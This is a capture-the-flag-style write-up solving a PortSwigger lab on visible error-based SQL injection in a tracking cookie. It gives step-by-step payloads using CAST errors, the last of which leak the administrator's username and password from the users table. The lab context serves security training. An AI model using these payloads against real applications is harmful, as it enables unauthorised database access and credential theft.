# Visible error-based SQL injection
# [lab](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

This lab contains a SQL injection vulnerability.
The application uses a tracking cookie for analytics,
and performs a SQL query containing the value of the submitted cookie.

### The target we will need to focus is TrackID 

End Goals :
* Exploit SQLi , Leak the username & password .
* Login as the administrator user .
------------
Analysis :
1- test that parameters is vulnerable .
## Intercept
open the burp suite catch request and send it to repeater to test possible SQL injections .

```
TrackingId=MTHshxABbU9laks5'
```
 > 500 Internal Error

```
TrackingId=MTHshxABbU9laks5'-- 
```
 > 200 OK

" Confirm that no longer receive an error "

2 -  use SELECT , CAST the returned value to an `int` data type:

```
trackingId=MTHshxABbU9laks5' AND CAST ((SELECT 1) AS int)--
 ```

- error saying that an `AND` condition must be a boolean


3 - Modify the condition, you can simply add a comparison operator (`1=`):

```
TrackingId=MTHshxABbU9laks5' AND 1=CAST((SELECT 1) AS int)--
 ```

- '  valid query  '

## Try to output information from DB:
- " from error output "

4 - The lab give us the table ‘users’ we'll use it 

```
trackingId=MTHshxABbU9laks5' AND 1=CAST((SELECT username FROM users) AS int )--
 ```

### Error : Maximum number of characterso, lets delete the cookie value and see what happen
- new error : more than one row returned

5 - Since too many rows are returned, we can limit it to only 1 username . 

```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
 ```

- The error message now shows us the username ‘administrator’

6 - now lets try it with password and see if he give us the pass also or not :)

```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
![image](https://github.com/Renat9s/sqli-labs/assets/126417250/d299dc5a-db14-4532-a703-a06a793c9e28)


- yes he did , Leaked the password also.
--------------------------------------------------------------------------
SOLVED THE LAB <3

